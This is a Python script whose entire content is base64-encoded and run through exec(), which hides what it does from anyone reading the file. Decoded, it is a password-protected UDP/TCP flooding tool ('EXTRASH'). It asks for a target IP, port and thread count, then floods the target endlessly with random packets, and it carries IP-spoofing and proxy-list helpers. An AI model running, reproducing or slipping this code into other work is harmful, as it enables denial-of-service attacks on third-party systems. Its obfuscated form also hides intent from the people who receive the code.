import base64
exec(base64.b64decode("aW1wb3J0IHJhbmRvbSANCmltcG9ydCBzb2NrZXQNCmltcG9ydCB0aHJlYWRpbmcjMUYwMEMzDQppbXBvcnQgdGltZQ0KaW1wb3J0IG9zICwgc3lzDQoNCm9zLnN5c3RlbSgnY2xzJyBpZiBvcy5uYW1lID09ICdudCcgZWxzZSAnY2xlYXInKQ0KcHJpbnQgKCIiIlx1MDAxYlszMW0NCuKVlOKVkOKVkOKVkOKVpuKVkOKVl+KVlOKVkOKVpuKVkOKVkOKVkOKVkOKVpuKVkOKVkOKVkOKVpuKVkOKVkOKVkOKVpuKVkOKVkOKVkOKVpuKVl+KUgOKVlOKVlw0K4pWR4pWU4pWQ4pWQ4pWp4pWX4pWa4pWd4pWU4pWj4pWU4pWX4pWU4pWX4pWR4pWU4pWQ4pWX4pWR4pWU4pWQ4pWX4pWR4pWU4pWQ4pWX4pWR4pWR4pSA4pWR4pWRDQrilZHilZrilZDilZDilZfilZrilZfilZTilZ3ilZrilZ3ilZHilZHilZrilaPilZrilZDilZ3ilZHilZHilIDilZHilZHilZrilZDilZDilaPilZrilZDilZ3ilZENCuKVkeKVlOKVkOKVkOKVneKVlOKVneKVmuKVl+KUgOKUgOKVkeKVkeKUgOKVkeKVlOKVl+KVlOKVo+KVmuKVkOKVneKVoOKVkOKVkOKVl+KVkeKVlOKVkOKVl+KVkQ0K4pWR4pWa4pWQ4pWQ4pWm4pWd4pWU4pWX4pWa4pWX4pSA4pWR4pWR4pSA4pWR4pWR4pWR4pWa4pWj4pWU4pWQ4pWX4pWR4pWa4pWQ4pWd4pWR4pWR4pSA4pWR4pWRDQrilZrilZDilZDilZDilanilZDilZ3ilZrilZDilZ3ilIDilZrilZ3ilIDilZrilZ3ilZrilZDilanilZ3ilIDilZrilanilZDilZDilZDilanilZ3ilIDilZrilZ1cdTAwMWJbMzdtIiIiKQ0KDQpwYXN3ID0gIkV4dHJhc2giDQoNCmZvciBpIGluIHJhbmdlKDMpOg0KICAgIHB3ZCA9IGlucHV0KCIgUGFzc3dvcmQgOiAiKQ0KICAgIGogPSAzDQogICAgaWYgKHB3ZCA9PSBwYXN3KToNCiAgICAgICAgdGltZS5zbGVlcCgyKQ0KICAgICAgICBwcmludChmIlx1MDAxYlszMW1bMF0gTG9hZGluZy4uLi4uLi4iKQ0KICAgICAgICB0aW1lLnNsZWVwKDEpDQogICAgICAgIHByaW50KCJbMTBdIExvYWRpbmcuLi4uLi4iKQ0KICAgICAgICB0aW1lLnNsZWVwKDEpDQogICAgICAgIHByaW50KCJbMjBdIExvYWRpbmcuLi4uLi4uIikNCiAgICAgICAgdGltZS5zbGVlcCgxKQ0KICAgICAgICBwcmludCgiWzMwXSBMb2FkaW5nLi4uLi4uLiIpDQogICAgICAgIHRpbWUuc2xlZXAoMSkNCiAgICAgICAgcHJpbnQoIls0MF0gTG9hZGluZy4uLi4uLi4iKQ0KICAgICAgICB0aW1lLnNsZWVwKDEpDQogICAgICAgIHByaW50KCJbNTBdIExvYWRpbmcuLi4uLi4uIikNCiAgICAgICAgdGltZS5zbGVlcCgxKQ0KICAgICAgICBwcmludCgiWzYwXSBMb2FkaW5nLi4uLi4uLiIpDQogICAgICAgIHRpbWUuc2xlZXAoMSkNCiAgICAgICAgcHJpbnQoIls3MF0gTG9hZGluZy4uLi4uLi4iKQ0KICAgICAgICB0aW1lLnNsZWVwKDEpDQogICAgICAgIHByaW50KCJbODBdIExvYWRpbmcuLi4uLi4uIikNCiAgICAgICAgdGltZS5zbGVlcCgxKQ0KICAgICAgICBwcmludCgiWzkwXSBMb2FkaW5nLi4uLi4uLiIpDQogICAgICAgIHRpbWUuc2xlZXAoMSkNCiAgICAgICAgcHJpbnQoIlsxMDBdIFByb2Nlc3NpbmdcbiIpDQogICAgICAgIHRpbWUuc2xlZXAoMykNCiAgICAgICAgYnJlYWsNCiAgICBlbHNlOg0KICAgICAgICB0aW1lLnNsZWVwKDIpDQogICAgICAgIHByaW50KCJbeF0gV3JvbmcgUGFzc3dvcmQgXG4iKQ0KICAgICAgICBjb250aW51ZQ0KdGltZS5zbGVlcCgyKQ0KcHJpbnQoIlN1Y2Nlc2Z1bGwgTG9naW5zIikNCnRpbWUuc2xlZXAoMikNCg0Kb3Muc3lzdGVtKCdjbHMnIGlmIG9zLm5hbWUgPT0gJ250JyBlbHNlICdjbGVhcicpDQpwcmludCAoIiIiXHUwMDFiWzMxbQ0K4pWU4pWQ4pWQ4pWQ4pWm4pWQ4pWX4pWU4pWQ4pWm4pWQ4pWQ4pWQ4pWQ4pWm4pWQ4pWQ4pWQ4pWm4pWQ4pWQ4pWQ4pWm4pWQ4pWQ4pWQ4pWm4pWX4pSA4pWU4pWXDQrilZHilZTilZDilZDilanilZfilZrilZ3ilZTilaPilZTilZfilZTilZfilZHilZTilZDilZfilZHilZTilZDilZfilZHilZTilZDilZfilZHilZHilIDilZHilZENCuKVkeKVmuKVkOKVkOKVl+KVmuKVl+KVlOKVneKVmuKVneKVkeKVkeKVmuKVo+KVmuKVkOKVneKVkeKVkeKUgOKVkeKVkeKVmuKVkOKVkOKVo+KVmuKVkOKVneKVkQ0K4pWR4pWU4pWQ4pWQ4pWd4pWU4pWd4pWa4pWX4pSA4pSA4pWR4pWR4pSA4pWR4pWU4pWX4pWU4pWj4pWa4pWQ4pWd4pWg4pWQ4pWQ4pWX4pWR4pWU4pWQ4pWX4pWRDQrilZHilZrilZDilZDilabilZ3ilZTilZfilZrilZfilIDilZHilZHilIDilZHilZHilZHilZrilaPilZTilZDilZfilZHilZrilZDilZ3ilZHilZHilIDilZHilZENCuKVmuKVkOKVkOKVkOKVqeKVkOKVneKVmuKVkOKVneKUgOKVmuKVneKUgOKVmuKVneKVmuKVkOKVqeKVneKUgOKVmuKVqeKVkOKVkOKVkOKVqeKVneKUgOKVmuKVnVx1MDAxYlszN20iIiIpDQppcCA9IHN0cihpbnB1dChmIlx1MDAxYlszMW0gW3hdaXA/ID4gIikpDQpwb3J0ID0gaW50KGlucHV0KCIgW3hdUG9ydD8gPiAiKSkNCnRpbWVzID0gaW50KGlucHV0KCIgW3hdVGltZXM/ID4gIikpDQp0aHJlYWRzID0gaW50KGlucHV0KCIgW3hdVGhyZWFkcyA+ICIpKQ0Kb3Muc3lzdGVtKCJjbGVhciIpDQpkZWYgcmFuZG9taXAoKToNCiAgcmFuZGlwID0gW10NCiAgcmFuZGlwMSA9IHJhbmRvbS5yYW5kaW50KDEsMjU1KQ0KICByYW5kaXAyID0gcmFuZG9tLnJhbmRpbnQoMSwyNTUpDQogIHJhbmRpcDMgPSByYW5kb20ucmFuZGludCgxLDI1NSkNCiAgcmFuZGlwNCA9IHJhbmRvbS5yYW5kaW50KDEsMjU1KQ0KICByYW5kaXA1ID0gcmFuZG9tLnJhbmRpbnQoMSwyNTUpDQogIHJhbmRpcDYgPSByYW5kb20ucmFuZGludCgxLDI1NSkNCiAgcmFuZGlwNyA9IHJhbmRvbS5yYW5kaW50KDEsMjU1KQ0KICByYW5kaXA4ID0gcmFuZG9tLnJhbmRpbnQoMSwyNTUpDQogIA0KICByYW5kaXAuYXBwZW5kKHJhbmRpcDEpDQogIHJhbmRpcC5hcHBlbmQocmFuZGlwMikNCiAgcmFuZGlwLmFwcGVuZChyYW5kaXAzKQ0KICByYW5kaXAuYXBwZW5kKHJhbmRpcDQpDQogIHJhbmRpcC5hcHBlbmQocmFuZGlwNSkNCiAgcmFuZGlwLmFwcGVuZChyYW5kaXA2KQ0KICByYW5kaXAuYXBwZW5kKHJhbmRpcDcpDQogIHJhbmRpcC5hcHBlbmQocmFuZGlwOCkNCg0KICByYW5kaXAgPSBzdHIocmFuZGlwWzBdKSArICIuIiArIHN0cihyYW5kaXBbMV0pICsgIi4iICsgc3RyKHJhbmRpcFsyXSkgKyAiLiIgKyBzdHIocmFuZGlwWzNdKQ0KICByZXR1cm4ocmFuZGlwKQ0KDQpkZWYgc3Bvb2ZlcigpOg0KICAgIGFkZHIgPSBbMTkyLCAxNjgsIDAsIDFdDQogICAgZCA9ICcuJw0KICAgIGFkZHJbMF0gPSBzdHIocmFuZG9tLnJhbmRyYW5nZSgxMSwgMTk3KSkNCiAgICBhZGRyWzFdID0gc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMCwgMjU1KSkNCiAgICBhZGRyWzJdID0gc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMCwgMjU1KSkNCiAgICBhZGRyWzNdID0gc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMiwgMjU0KSkNCiAgICBhZGRyWzRdID0gc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMiwgMjU2KSkNCiAgICBhZGRyWzVdID0gc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMiwgMjU0KSkNCiAgICBhZGRyWzZdID0gc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMiwgMjU2KSkNCiAgICBhc3NlbWVibGVkID0gYWRkclswXSArIGQgKyBhZGRyWzFdICsgZCArIGFkZHJbMl0gKyBkICsgYWRkclszXSArIGQgKyBhZGRyWzRdICsgZCArIGFkZHJbNV0gKyBkICsgYWRkcls2XQ0KICAgIHJldHVybiBhc3NlbWVibGVkDQoNCmRlZiBnZXRwcm94eSgpOg0KICAgIGdsb2JhbCBwcm94aWVzDQogICAgZiA9IG9wZW4oZid7bnByb3h9LnR4dCcsJ3diJykNCiAgICByID0gcmVxdWVzdHMuZ2V0KHVybHByb3h5KQ0KICAgIGYud3JpdGUoci5jb250ZW50KQ0KICAgIGYuY2xvc2UoKQ0KICAgIHByb3hpZXMgPSBvcGVuKGYne25wcm94fS50eHQnKS5yZWFkbGluZXMoKQ0KDQpkZWYgcHJveHlhc2soKToNCiAgICBnbG9iYWwgdXJscHJveHkNCiAgICBwcm8gPSBpbnB1dChmJ1t+XSBHZXQgTmV3IExpc3Qge25wcm94fSBbWV0gOiAnKQ0KICAgIGlmIHBybyA9PSAiWSI6DQogICAgICAgIHVybHByb3h5ID0gImh0dHBzOi8vd3d3LnByb3h5LWxpc3QuZG93bmxvYWQvYXBpL3YxL2dldD90eXBlPXNvY2tzNSINCiAgICAgICAgdXJscHJveHkgPSAiaHR0cHM6Ly9hcGkucHJveHlzY3JhcGUuY29tLz9yZXF1ZXN0PWRpc3BsYXlwcm94aWVzJnByb3h5dHlwZT1zb2NrczUmdGltZW91dD01MDAwJmNvdW50cnk9YWxsJnNzbD15ZXMmYW5vbnltaXR5PWFsbCINCiAgICAgICAgZ2V0cHJveHkoKQ0KICAgICAgICBhc2t0aHJlYWRzKCkNCiAgICBlbHNlOg0KICAgICAgICBwcm94eWFzaygpDQogICAgICAgIA0KZGVmIGF0dGFjaygpOg0KCWRhdGEgPSByYW5kb20uX3VyYW5kb20oNjE1KQ0KCXdoaWxlIFRydWU6DQoJCXRyeToNCgkJCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkNCgkJCWFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpDQoJCQlmb3IgeCBpbiByYW5nZSh0aW1lcyk6DQoJCQkJcy5zZW5kdG8oZGF0YSxhZGRyKQ0KCQkJcHJpbnQoZiJcdTAwMWJbMzFtIEVYVFJBU0ggXHUwMDFiWzMxbUF0dGFjayBpcCBcdTAwMWJbMzdte2lwfSBcdTAwMWJbMzFtUG9ydCBcdTAwMWJbMzdte3BvcnR9IikNCgkJZXhjZXB0Og0KCQkJcHJpbnQoZiJcdTAwMWJbMzJtIEVYVFJBU0ggIFx1MDAxYlszMW1BdHRhY2sgaXAgXHUwMDFiWzM3bXtpcH0gXHUwMDFiWzMxbVBvcnQgXHUwMDFiWzM3bXtwb3J0fSIpDQoNCmRlZiBydW4yKCk6DQoJZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxMDI1KQ0KCWkgPSByYW5kb20uY2hvaWNlKCgiWypdIiwiWyFdIiwiWyNdIikpDQoJd2hpbGUgVHJ1ZToNCgkJdHJ5Og0KCQkJcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCgkJCXMuY29ubmVjdCgoaXAscG9ydCkpDQoJCQlzLnNlbmQoZGF0YSkNCgkJCWZvciB4IGluIHJhbmdlKHRpbWVzKToNCgkJCQlzLnNlbmQoZGF0YSkNCgkJCXByaW50KGkgKyIgU2VudCEhISIpDQoJCWV4Y2VwdDoNCgkJCXMuY2xvc2UoKQ0KCQkJcHJpbnQoIlsqXSBFcnJvciIpDQoNCmZvciBfeCBpbiByYW5nZSh0aHJlYWRzKToNCgl0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1hdHRhY2spLnN0YXJ0KCk="))